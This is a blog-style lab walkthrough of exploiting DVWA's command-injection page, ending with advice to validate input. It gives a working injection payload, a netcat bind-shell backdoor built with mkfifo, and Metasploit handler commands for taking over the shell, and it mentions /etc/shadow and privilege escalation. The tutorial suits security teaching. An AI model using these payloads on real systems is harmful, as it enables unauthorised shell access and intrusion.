---
layout: post
section-type: post
has-comments: true
title: Exploiting Command Injection Vulnerability in DVWA
category: tech
tags: ["security", "redteam"]
---

In this post we'll go through the process of exploiting command injection
vulnerability in [DVWA]({% post_url 2017-04-02-dvwa-kali %}), and gain access to
the server using [Metasploit](https://www.metasploit.com/).

Command Injection is a type of vulnerability that allows attackers to execute
arbitrary commands on the host operating system by manipulating a vulnerable
software that the attacker can interact with. This type of attack is possible
when the application fails to properly validate user input and uses it to
execute shell commands on the host operating system.

To begin, we need to navigate to the _Command Injection_ section of DVWA, which
is designed to ping an IP address. Let's test the section by entering the IP
address `127.0.0.1` and observing the result.

![ci-1](/img/posts/ci/ci-1.png)

As we can see, the _Command Injection_ it's safe to assume that it simply
appends our input to the underlying bash command, and then it sends the result
as part of the returned HTML page. This means that we can use the input field to
execute arbitrary commands on the host operating system.

Let's try appending a list bash command after our input IP address:

```bash
127.0.0.1; ls
```

![ci-2](/img/posts/ci/ci-2.png)

As expected, the _Command Injection_ section executes the appended command and
displays the result. This confirms that we can use this vulnerability to execute
arbitrary commands on the host operating system.

Now, let's create a backdoor on the server by listening on port `4444` using
netcat and redirecting all the incoming bytes to a bash shell:

```bash
127.0.0.1; mkfifo /tmp/pipe ; sh /tmp/pipe | nc -l -p 4444 > /tmp/pipe
```

![ci-3](/img/posts/ci/ci-3.png)

As you can see, the page is loading forever, which means that our backdoor is
open and waiting for us.

Next, let's use Metasploit to gain access to the server. We will start
`msfconsole` and use the `exploit/multi/handler` module to open a shell on the
server:

```bash
msfconsole
use exploit/multi/handler
set payload linux/x64/shell/bind_tcp
set RHOST 127.0.0.1
exploit
```

![ci-4](/img/posts/ci/ci-4.png)

Note that we didn't set the `LPORT` of `bind_tcp`, since the default one is
`4444`.

As you can see, we are logged in as the `www-data` user, which has limited
privileges. We can't read the `/etc/shadow` file, which contains the user
passwords of the operating system. However, we have all the privileges that the
`www-data` user has and we can potentially modify DVWA or escalate to root by
exploiting a local privilege escalation vulnerability.

As a web developer, it's important to always sanitize your user input and never
pass this data to other applications without validating it first. In this case,
the application should validate the provided IP address and make sure that it's
a valid IP address before passing it to the `ping` command.
